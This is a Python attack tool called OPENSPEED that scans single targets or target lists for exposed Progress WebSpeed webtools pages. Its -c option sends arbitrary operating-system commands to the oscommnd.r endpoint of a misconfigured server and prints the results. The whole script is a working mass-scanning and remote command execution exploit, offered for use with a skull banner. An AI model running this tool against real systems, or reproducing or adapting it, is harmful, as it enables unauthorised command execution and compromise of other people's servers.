#!/usr/bin/env python3

import httpx
import argparse
import re
from bs4 import BeautifulSoup

skull_ascii = """
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~
"""
nomade_ascii = """
----------------------------------------------------------------------------------------
| ░▒▓███████▓▒░░▒▓████████▓▒░▒▓██████████████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░  |
| ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ |
| ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ |
| ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  |
| ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ |
| ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░ |
| ░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓███████▓▒░░▒▓███████▓▒░  |
----------------------------------------------------------------------------------------                                                                                      
""" 
app_version = "OPENSPEED V1.0"
known_files = ["/workshop",
               "/webtools/appmgr.p",
               "/webtools/databrw.p",
               "/webtools/dirlist.w",
               "/webtools/oscommnd.w",
               "/webtools/session.w",
               "/webtools/dblist.w",
               "/webtools/propath.w"]
success=["application manager", 
         "database browser",
         "webspeed file tools",
         "database browser", 
         "webspeed os command",
         "webspeed agent variables", 
         "webspeed databases",
         "webspeed webtools"]         
errors =["application error", "webspeed error from messenger process","application error", "webspeed error from messenger process (6019)"]
reset = "\033[0m"
red = "\033[91m"
green = "\033[92m"
yellow = "\033[93m"
blue = "\033[94m"
magenta = "\033[95m"
cyan = "\033[96m"
white = "\033[97m"


def main():
    try:
        params = checkParams()

        if params.nobanner is None:
            printBanner()

        if params.oscommand is not None and params.url is not None:
           sendOsCommand(params.url, params.oscommand)
           return
        
        if params.url is not None:
            checkVulnerability(params.url)
        elif params.list is not None:
            checkListOfTargets(params.list) 
        else:
            print('Wrong usage run openwebspeed -h to see options')
        

        print('\n\n{green}successfuly executed -  good luck!')
    except KeyboardInterrupt:
        print(f"{red} exiting...")

def checkParams():
    parser = argparse.ArgumentParser(description="Check if target is vulnerable to a misconfiguration of webspeed")
    parser.add_argument('-nb', '--nobanner', required=False, help="Don't print banner", )
    parser.add_argument('-l', '--list', required=False, help="Path to a file with list of targets")
    parser.add_argument('-u', '--url', required=False, help="Target url")
    parser.add_argument('-o', '--output', required=False, help="Path to the output file to save the results.")
    parser.add_argument('-a', '--all', required=False, help="Scann all known files looking for vulnerabilities")
    parser.add_argument('-c', '--oscommand', required=False, help="Send a Os command to a vulnerable target")
    return parser.parse_args()

def printBanner():        
    print(f"{green}{skull_ascii}{reset}")
    print(f"{red}{nomade_ascii}{reset}")
    print(f"""
{blue}******************************************************************************** {app_version}{reset}
    """)

def checkListOfTargets(filePath):
    print(f"opening file: {filePath}")
    with open(filePath, 'r') as file:
        urls = [line.strip() for line in file.readlines()]
        for url in urls:
             checkVulnerability(url)



def checkVulnerability(targetUrl ):
    try:
        print(f"\n{cyan}checking target: {targetUrl}...{reset}")
        for path in known_files:
            fullUrl = remove_trailing_slash(targetUrl) + path
            with httpx.Client(verify=False) as client:
                response = httpx.get(fullUrl, timeout=100)
        
            if response.status_code == 301:
               raise httpx.RequestError("301 Moved Permanently")
            
            if response.status_code == 200:                      
               lowerHtml = response.text.lower()
               if any(keyword in lowerHtml for keyword in success ):            
                    print(f"{green} ****  {fullUrl} is vulnerable{reset}") 
               elif any(keyword in lowerHtml for keyword in errors ) :             
                    print(f"{red}{fullUrl} is not vulnerable{reset}")
               else:
                    print(f"{yellow}{fullUrl} unknown result{reset}")         
    except httpx.RequestError as e:
                print(f"{red}{targetUrl} is down or not reachable. Error: {e}{reset}")

def outputFile(outputFilePath, arrayData):
    print(f"writing output file: {outputFilePath}...")
    with open(outputFilePath, 'a') as output:
        for data in arrayData:
            output.write(f"{data}\n")

def sendOsCommand(url,command):
    print(f"{cyan}running command {command} on vulnerable target{reset}")
    completeUrl = remove_trailing_slash(url) + "/webtools/oscommnd.r"
    data = {"CODE":command, "Run": "Submit"}
    
    with httpx.Client(verify=False) as client:
            response = httpx.post(completeUrl,  timeout=10, data=data)
            if response.status_code == 200:  
                soup = BeautifulSoup(response.text, "html.parser")
                pre_tags = soup.find_all("pre")
                for tag in pre_tags:
                    print(tag.get_text())

def remove_trailing_slash(string):
    return re.sub(r'\/$', '', string)


if __name__ == "__main__":
    main()



